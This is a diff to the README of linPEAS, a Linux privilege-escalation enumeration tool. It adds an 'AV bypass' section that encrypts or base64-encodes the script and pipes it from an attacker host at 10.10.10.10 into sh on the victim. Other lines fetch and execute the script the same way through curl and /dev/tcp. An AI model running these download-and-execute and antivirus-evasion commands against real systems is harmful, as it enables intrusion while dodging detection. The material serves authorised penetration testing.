@@ -17,11 +17,11 @@ curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-
 
 ```bash
 #Local network
-python -m SimpleHTTPServer 80
+sudo python -m SimpleHTTPServer 80
 curl 10.10.10.10/linpeas.sh | sh
 
 #Without curl
-nc -q 5 -lvnp 80 < linpeas.sh
+sudo nc -q 5 -lvnp 80 < linpeas.sh
 cat < /dev/tcp/10.10.10.10/80 | sh
 ```
 
@@ -29,6 +29,19 @@ cat < /dev/tcp/10.10.10.10/80 | sh
 #Output to file
 linpeas -a > /dev/shm/linpeas.txt
 less -r /dev/shm/linpeas.txt #Read with colors
+```
+
+## AV bypass
+```bash
+#open-ssl encryption
+openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
+sudo python -m SimpleHTTPServer 80 #Start HTTP server
+curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim
+
+#Base64 encoded
+base64 -w0 linpeas.sh > lp.enc
+sudo python -m SimpleHTTPServer 80 #Start HTTP server
+curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
 ```
 
 **Use the parameter `-a` to execute all these checks.**
@@ -222,6 +235,8 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [x] Neo4j
   - [x] Cloud-Init
   - [x] Erlang Cookie
+  - [X] GVM config
+  - [x] IPSEC files
 
 
 - **Generic Interesting Files**
